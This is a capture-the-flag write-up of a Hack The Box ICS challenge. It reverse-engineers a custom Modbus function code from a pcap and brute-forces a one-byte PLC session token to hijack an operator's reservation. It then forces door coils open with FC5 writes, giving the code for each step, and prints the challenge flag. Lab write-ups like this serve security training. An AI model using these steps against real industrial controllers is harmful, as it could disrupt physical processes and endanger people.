# Hack The Box: Knock Knock
*Category: Hardware / ICS-SCADA (Custom Modbus Protocol)*
*Difficulty: Medium*
*Author: Atlas*

---

## 📝 Description
> During their mission inside Vault 79, the crew inadvertently trips an unmarked sensor not shown on the schematics and blueprints, triggering the Vault's automated defense system. The main and secondary doors slam shut, and the walls begin slowly closing in, threatening to crush the crew inside. With time running out, the crew quickly gathers around the maintenance console, where they have already collected significant information about the custom protocol used on top of Modbus to interact with the PLC controlling the doors. The hackers spring into action, aiming to hijack the session of the operator program that was activated. Can you make it out alive before time runs out?
>
> `154.57.164.74:32563`

Artifacts provided: `client.py` (a partially-filled pymodbus client template for a custom function code), `Notes.png` (hand-drawn notes on the custom protocol), and `traffic_log.pcapng` (a capture of a legitimate "operator" session against the PLC).

---

## 🧠 TL;DR
- Vulnerability: A custom Modbus function code (`0x66`) implements a PLC "reservation" system gated by a **single unauthenticated 1-byte session token** with no binding to the client's IP/connection. Anyone who can reach the PLC can brute-force that byte (256 possibilities) against any session-scoped operation.
- Exploit: Reverse-engineered the FC `0x66` sub-protocol from the pcap and by sweeping all 256 sub-function codes against the live target, brute-forced the operator's active session id via the `release_reservation` sub-function (whichever guess succeeds frees/hijacks the reservation), immediately reserved the PLC for ourselves, started the PLC logic, then forced each door coil open individually with standard Modbus **FC5 (write single coil)** — FC15 (write multiple coils) was silently reverted by the PLC's internal ladder logic each cycle, but a per-coil FC5 write stuck.
- Outcome: Both door coils opened; ~9 seconds later (matching the "doors take ~10s to open" note) the flag appeared written into the holding registers starting at address 123.
- Flag: `HTB{71m3_70_f02c3_7h3_v4u17_d0025_0p3n!340}`

---

## 🔍 Enumeration

### Notes.png
The image is stylized "parchment" with two fields explicitly marked `UNKOWN` (custom function code and its sub-function codes) — a hint that these had to be recovered from the pcap rather than being handed to us. Enhancing contrast/auto-levels confirmed no hidden/steganographic text; the blank fields were genuinely blank. What the notes did give us:
```
Door Control Coils:      0x01 Main Door, 0x02 Secondary Door
Known Error Codes:       0xE001 Connection Timeout, 0xE002 Data Format Error,
                          0xE003 Invalid Function Code, 0xE005 PLC is not Reserved,
                          0xE006 PLC Already Reserved, 0xE007 PLC reservation already
                          completed, 0xE008 Invalid or expired session
Additional info:          PLC cycle = 1s; doors take ~10s to fully open; PLC logic can
                          override Modbus writes; FLAG_ADDR_HOLDING_REGISTER = 123;
                          the pcap shows: Reserve -> Start Logic -> Disable Write
                          Access -> Release (among other commands)
```

### `client.py` protocol scaffold
The provided template revealed the wire format for the custom protocol: it rides on top of standard Modbus/TCP framing using one fixed, vendor-specific function code (`CUSTOM_FUNCTION_CODE`), with the request/response body being an arbitrary list of bytes the application defines itself — i.e. everything past the function code is fully custom.

### PCAP analysis ([enumerate_subfunctions.py](enumerate_subfunctions.py) applies the same decoding logic used here)
**Input:** Dump every TCP payload and manually parse the Modbus MBAP header (transaction id / protocol id / length / unit id) plus PDU (function code + data):
```bash
tshark -r traffic_log.pcapng -T fields -e frame.number -e ip.src -e ip.dst \
  -e tcp.srcport -e tcp.dstport -e tcp.payload
```
**Output (custom-FC frames only, TCP stream on port 50482):**
```
tid=1 req data=0047                              resp=0047ff0100000001
tid=2 req data=0012                              resp=0012ff0000
tid=3 req data=0010086f70657261746f72 ("operator") resp=0010ff81
tid=4 req data=8145                              resp=8145ff01
tid=5 req data=8153                              resp=8153ff01
tid=6 req data=8111                              resp=8111ff81
```
Two things fell out immediately:
- The custom **function code is `0x66`**, fixed for every request (matching `client.py`'s single global `CUSTOM_FUNCTION_CODE`).
- The data payload format is **`[session_id][sub_function_code][params...]`**. The reserve call (`sub_function=0x10`, string `"operator"`) returns a freshly-assigned session id (`0x81`) which every subsequent command in the sequence echoes back. This lined up exactly with the notes' documented action order: Reserve (`0x10`) → Start Logic (`0x45`) → Disable Write Access (`0x53`) → Release (`0x11`).

### Live protocol probing & error-code confirmation
**Input:** Query sub-function `0x12` (seen used pre-reservation in the pcap) against the live target:
```python
m.custom(0x00, 0x12)
```
**Output:** `0012ff01006f70657261746f72` → decodes to `is_reserved=1`, name=`"operator"` — **the live PLC was already reserved by a real operator session** the moment we connected.

**Input:** Confirm the error-response framing by deliberately triggering known errors (attempting to reserve while already reserved, and calling an invalid sub-function):
```python
m.custom(0x00, 0x10, extra=b"\x08attacker")   # reserve attempt
m.custom(0x00, 0xAA)                          # invalid sub-function
```
**Output:**
```
reserve attempt:      0010 f0 e006   -> status=0xf0 (error), code=0xE006 "Already Reserved"
invalid sub-function: 00aa f0 e003   -> status=0xf0 (error), code=0xE003 "Invalid Function Code"
```
This confirmed: **`0xff` = success status, `0xf0` = error status followed by a 2-byte error code** matching the notes exactly.

**Input:** Sweep all 256 possible sub-function codes with `session=0x00` ([enumerate_subfunctions.py](enumerate_subfunctions.py)), bucketing by the returned status/error code. A sub-function that doesn't exist returns `0xE003`; one that exists but needs a reservation/correct session returns `0xE005`/`0xE006`/`0xE008`; a public op returns success.
**Output:** Full opcode map recovered:

| Code | Function | Evidence |
|------|----------|----------|
| `0x10` | reserve (take_reservation) | `0xE006` already-reserved |
| `0x11` | release (release_reservation) | `0xE008` needs correct session |
| `0x12` | query reservation status | public — returns `is_reserved` + reserving name |
| `0x45` | start PLC logic | `0xE008` needs correct session |
| `0x46` | stop PLC logic | `0xE008` needs correct session |
| `0x47` | query PLC status/version | public |
| `0x50` | device info (serial/asset — decoy) | public |
| `0x51` | device info (model/firmware — decoy) | public |
| `0x52` | enable write access | `0xE008` needs correct session |
| `0x53` | disable write access | `0xE008` needs correct session |

No custom "force door" sub-function exists — related ops are grouped in adjacent hex ranges exactly as the notes hinted ("functionality that controls a specific area is grouped together": `0x10`/`0x11`/`0x12` = reservation group, `0x45`/`0x46` = logic control, `0x52`/`0x53` = write-access control), confirming door control has to happen through standard Modbus coil writes rather than a hidden custom opcode.

---

## 💥 Exploitation

### Hijacking the operator's session
The reservation system's only "authentication" is a 1-byte session token handed back on reserve — no binding to the reserving client's connection or IP. Since the live PLC was already reserved by an active operator (confirmed via `0x12` above) and our own reserve attempt failed with `0xE006`, the reservation had to be stolen rather than freshly acquired.

**Input:** Brute-force every possible session id against `release_reservation` (`0x11`) — the one guess that matches the operator's real session will succeed and free the PLC ([exploit.py](exploit.py)):
```python
for sid in range(256):
    tid, unit, fc, data = m.custom(sid, 0x11)
    if data[2] == 0xff:
        print(f"hit: session 0x{sid:02x}")
        break
```
**Output:**
```
[+] HIT! session=0x98 released successfully -> 9811ff98
swept in 14.09s, found=152
status after: 0012ff0000    # is_reserved now 0
```
The operator's session was kicked out in ~14 seconds — comfortably inside their normal reservation window (the pcap showed the full Reserve→Start→Disable→Release cycle spanning ~25 seconds).

### Reserving for ourselves and forcing the doors
With the PLC free, we reserved it under our own name and got a fresh, known session id:
```python
extra = bytes([len(b"pwned")]) + b"pwned"
m.custom(0x00, 0x10, extra)      # -> session = 0x36 (this run)
m.custom(session, 0x45)          # start_logic
```
Starting the logic alone didn't move the doors — polling coils for 20 seconds afterward showed no change. The likely explanation, per the notes' warning that "the PLC logic might override modbus write commands due to priority of internal operations": writing both door coils at once via **FC15 (write multiple coils)** got silently reverted within the PLC's 1-second scan cycle — the write was ack'd at the protocol level but the coil read back as unchanged immediately after.

**Input:** Write each door coil individually via **FC5 (write single coil)** instead:
```python
m.write_single_coil(1, 1)   # main door
m.write_single_coil(2, 1)   # secondary door
```
**Output:** Both coils stuck immediately (`coils=0103` on the next read) and stayed open — FC5 per-coil writes weren't fought by the internal logic the way the FC15 bulk write was.

**Input:** Poll coils and holding register 123 (60 registers, generous headroom) once a second:
```python
_, _, _, coils = m.read_coils(1, 2)
_, _, _, hold  = m.read_holding(123, 60)
```
**Output:**
```
t+8s  coils=0103 holding123=1000000000000000000000000000000000
t+9s  coils=0103 holding123=10004800540042007b00370031006d0033...   <- flag begins appearing
```
Consistent with the notes ("doors take approximately 10 seconds to fully open"), the holding registers stayed zeroed until ~9 seconds after the door coils opened, then filled with ASCII text packed one character per register (low byte only, high byte always `0x00`).

### Solution

**Answer:** `HTB{71m3_70_f02c3_7h3_v4u17_d0025_0p3n!340}`

**Summary:** The custom Modbus function code `0x66` implements a PLC reservation/session system with a completely unauthenticated single-byte session token. After reverse-engineering the sub-function opcode map from the provided pcap and by sweeping all 256 possible codes against the live target (distinguishing valid-but-gated ops from nonexistent ones via the documented `0xE00x` error codes), the operator's active session was hijacked by brute-forcing the `release_reservation` call across all 256 possible session ids — a ~14 second attack that kicked the legitimate operator out and freed the PLC. From there we reserved the PLC ourselves, started its logic, and forced each door coil open individually via standard Modbus FC5 (bulk FC15 writes were silently reverted by the PLC's own internal control logic each scan cycle). Roughly 9 seconds after both doors opened, the flag was written into the holding registers starting at address 123, readable via a plain, unauthenticated Modbus FC3 read.

**Scripts:**
- [mb_client.py](mb_client.py) — minimal Modbus/TCP client supporting standard FC1/FC3/FC5/FC15 plus the custom FC 0x66 `[session][sub_function][params]` protocol.
- [enumerate_subfunctions.py](enumerate_subfunctions.py) — sweeps all 256 sub-function codes to map the full custom opcode space via its error-code responses.
- [exploit.py](exploit.py) — the final attack: brute-forces/hijacks the operator's session via `release_reservation`, reserves the PLC, starts logic, forces both door coils open via FC5, and polls for the flag in holding registers.

---

## Dead Ends & Lessons Learned

| Approach Tried | Why It Failed | What We Learned |
|---|---|---|
| Assuming `Notes.png`'s `UNKOWN` fields hid faded/stego'd text | Contrast enhancement, auto-levels, exiftool, and binwalk all showed nothing — the fields were genuinely left blank by design | Not every suspiciously blank field in a CTF image is steganography; sometimes the artifact is explicitly telling you "go derive this yourself" |
| Writing both door coils at once via FC15 (write multiple coils) after starting PLC logic | The write was acknowledged at the protocol level but silently reverted within the next ~1s PLC scan cycle — coil read-back showed no change | The notes' warning about the PLC logic "overriding" writes was literal: a bulk multi-coil write loses the race against the ladder logic's own cycle, but single-coil FC5 writes to the same addresses were not reverted |
| Trying `enable_write_access` (`0x52`) / `stop_logic` (`0x46`) before writing coils, expecting one of them to be the missing precondition | Neither changed the outcome of the FC15 write — the actual fix was simply using FC5 instead of FC15 | Don't assume a documented-sounding companion opcode is the blocker; test the simplest alternative (a different standard function code) before chasing more custom sub-functions |
| Assuming the 1-byte session token from the old pcap (`0x81`) would still be valid against the live target | Each PLC reservation cycle assigns a fresh, unpredictable session id — the live server was on a completely different value | Session/reservation tokens captured in a reference pcap are only valid for that historical run; a live target requires re-deriving or brute-forcing current state, not replaying old captures |

---

## Flag Summary

| Part | Answer | Explanation |
|------|--------|-------------|
| Vault Door Override | `HTB{71m3_70_f02c3_7h3_v4u17_d0025_0p3n!340}` | Reverse-engineered the custom Modbus FC 0x66 protocol from the pcap, brute-forced the operator's unauthenticated 1-byte session token via `release_reservation` to hijack/free the PLC, reserved it, started its logic, and forced both door coils open individually via Modbus FC5 (bulk FC15 was reverted by internal PLC logic). The flag appeared in holding registers starting at address 123 once both doors were fully open. |

---

## References
- Modbus/TCP protocol (MBAP header + PDU framing, standard FC1/FC3/FC5/FC15)
- `pymodbus` — used as the basis for the provided client template (`client.py`)
- `tshark`/Wireshark — pcap analysis and payload extraction
